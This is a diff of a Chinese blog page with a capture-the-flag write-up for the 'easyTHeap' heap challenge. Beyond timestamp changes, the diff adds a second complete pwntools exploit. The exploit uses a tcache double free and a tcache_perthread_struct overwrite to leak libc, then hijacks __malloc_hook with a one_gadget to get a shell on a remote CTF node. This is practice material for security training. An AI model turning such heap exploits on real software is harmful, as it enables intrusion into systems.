@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1598197266772" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1598227937681" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1598197266772" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1598227937681" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-08-23</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">9.6
+                                    href="#">11.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">2243</a></span>
+                                    <span class="post-words">words:<a href="#">2537</a></span>
                                     
                                             Views:
                                             <span data-hk-page="current"> - </span>
@@ -369,7 +369,7 @@ U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也�
 <img src="https://l3mon629.github.io/post-images/1598196903032.png" alt="" loading="lazy"><br>
 <img src="https://l3mon629.github.io/post-images/1598196908122.png" alt="" loading="lazy"></p>
 <h3 id="一种方法">一种方法</h3>
-<p>唔……，本地只有2.28版本的libc，所以远程不可能打通，本地简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz</p>
+<p>唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz</p>
 <p>exp:</p>
 <pre><code class="language-python">from pwn import *
 
@@ -455,7 +455,93 @@ add(0x20)
 p.interactive()
 </code></pre>
 <h3 id="另一种方法">另一种方法</h3>
-<p>似乎还有别的方法，我再想想还能不能用别的方法做出来（逃</p>
+<p>（似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ）<br>
+好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈</p>
+<pre><code class="language-python">from pwn import *
+
+'''
+
+author : lemon
+libc_version: 2.27
+
+'''
+
+libc = ELF('./libc-2.27.so')
+
+local = 0
+
+if local == 1:
+    p = process('./vn_pwn_easyTHeap')
+else:
+    p = remote('node3.buuoj.cn',27567)
+
+def dbg():
+    gdb.attach(p)
+
+def add(size):
+    p.sendlineafter('choice: ','1')
+    p.sendlineafter('size?',str(size))
+
+def edit(index,content):
+    p.sendafter('choice: ','2')
+    p.recvuntil('idx?')
+    p.sendline(str(index))
+    p.recvuntil('content:')
+    p.send(content)
+
+def show(index):
+    p.sendafter('choice: ','3')
+    p.recvuntil('idx?')
+    p.sendline(str(index))
+
+def free(index):
+    p.sendafter('choice: ','4')
+    p.recvuntil('idx?')
+    p.sendline(str(index))
+
+print(&quot;============ step 1: 逃逸tcache bin ===========&quot;)
+add(0x100)	#0
+add(0x10)	#1 protect 0
+
+free(0)	
+free(0)
+show(0)
+
+tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\00')) - 0x250
+
+add(0x100)	#2 (0)
+edit(2,p64(tcache_perthread_struct))
+add(0x100)	#3 
+add(0x100)	#4 tcache_perthread_struct
+
+payload = b'\07' * 0x40
+edit(4,payload)
+
+print(&quot;=========== step 2: 泄漏libc ============&quot;)
+
+free(0)
+show(0)
+
+libc_base = u64(p.recv(6).ljust(8,b'\00')) - 96 - 0x10 - libc.symbols['__malloc_hook']
+#libc_base = u64(p.recv(6).ljust(8,b'\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0)
+print('libc base:' + hex(libc_base))
+__malloc_hook = libc_base + libc.symbols['__malloc_hook']
+__libc_realloc = libc_base + libc.symbols['__libc_realloc']
+one_gadget_list = [0x4f2c5,0x4f322,0x10a38c]
+one_gadget = libc_base + one_gadget_list[1]
+
+print(&quot;=========== step 3: one_gadget ===========&quot;)
+
+payload = b'\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20)
+edit(4,payload)
+
+add(0x30)	#5
+payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8)
+edit(5,payload_one_gadget)
+add(0x20)	#触发one_gadget
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -511,8 +597,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=qzone&title=[V&amp;N2020 公开赛]easyTHeap&pics=https://l3mon629.github.io/images/avatar.png?v=1598197266772&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=weibo&title=[V&amp;N2020 公开赛]easyTHeap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598197266772 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=qzone&title=[V&amp;N2020 公开赛]easyTHeap&pics=https://l3mon629.github.io/images/avatar.png?v=1598227937681&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/&sharesource=weibo&title=[V&amp;N2020 公开赛]easyTHeap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598227937681 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -602,7 +688,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1598197266772);
+                    newDate.setTime(1598227937681);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
